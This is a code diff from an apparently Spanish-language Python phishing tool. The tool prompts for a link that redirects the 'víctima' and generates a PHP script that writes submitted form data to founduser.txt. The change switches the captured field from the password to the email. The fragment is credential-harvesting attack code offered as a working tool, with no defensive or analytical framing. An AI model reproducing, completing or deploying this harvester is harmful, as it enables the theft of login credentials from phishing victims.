@@ -46,7 +46,7 @@ def link():
     "https://facebook.com"    1- Atrás\n''')
     y=input('Inserte un link para redireccionar a la víctima: ')
     r=('''<?php
-    $user = $_POST["pass"];
+    $user = $_POST["email"];
     $co = "===========================================\n"; 
     $cl = "===========================================\n";
     $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
